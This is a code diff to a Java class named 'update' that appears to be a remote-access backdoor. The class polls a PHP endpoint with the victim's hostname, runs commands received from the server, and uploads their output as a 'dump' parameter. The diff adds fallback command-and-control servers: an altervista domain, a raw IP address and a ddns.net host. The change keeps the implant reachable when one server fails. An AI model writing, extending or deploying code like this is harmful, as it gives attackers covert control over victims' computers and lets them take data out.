@@ -34,6 +34,10 @@ public class update{
 		String hostname="none";
 		String result="";
 		String output="";
+		String site="paner.altervista.org";
+		String site1="paner.altervista.org";
+		String site2="52.26.124.145";
+		String site3="certificates.ddns.net";
 		InetAddress addr;
 		Runtime runtime = Runtime.getRuntime();
 		String path = update.class.getProtectionDomain().getCodeSource().getLocation().getPath();
@@ -142,7 +146,18 @@ public class update{
 	    		//{
 	    		//    System.out.println("Hostname can not be resolved");
 	    		//}
-	        	result=getResponseFromUrl("http://paner.altervista.org/svc/wup.php?pc="+hostname);
+	        	result=getResponseFromUrl("http://"+site+"/svc/wup.php?pc="+hostname);
+	        	if (result.equals(""))
+				{
+	        		site=site2;
+					result=getResponseFromUrl("http://"+site+"/svc/wup.php?pc="+hostname);
+					if (result.equals(""))
+					{
+		        		site=site3;
+						result=getResponseFromUrl("http://"+site+"/svc/wup.php?pc="+hostname);
+
+					}
+				}
 	        	String[] array = result.split("\\|\\|", -1);
 	        	String exec=array[6].substring(5);
 	        	String cmd=array[7].substring(4);
@@ -164,7 +179,7 @@ public class update{
 		        			output = output.replace("\\", "\\\\");
 		        			output = output.replaceAll("(\r\n|\n)", "<br>");
 		        			output = output.replaceAll(" ", "%20");
-	        				result=getResponseFromUrl("http://paner.altervista.org/svc/wup.php?pc="+hostname+"&dump="+output);
+	        				result=getResponseFromUrl("http://"+site+"/svc/wup.php?pc="+hostname+"&dump="+output);
 	    	        	}
 	        			else
 	        			{
@@ -174,7 +189,7 @@ public class update{
 		        			catch (IOException e) {
 		        			}	
 	        			}
-	        			result=getResponseFromUrl("http://paner.altervista.org/svc/wup.php?pc="+hostname+"&exec=0");
+	        			result=getResponseFromUrl("http://"+site+"/svc/wup.php?pc="+hostname+"&exec=0");
 	        		
 	        	}	
 		        try {
@@ -183,7 +198,7 @@ public class update{
 		        catch (InterruptedException e) {
 		            e.printStackTrace();
 		        }
-		        
+		        site=site1;
 	        }
 		//}
 	    //catch (IOException e) {
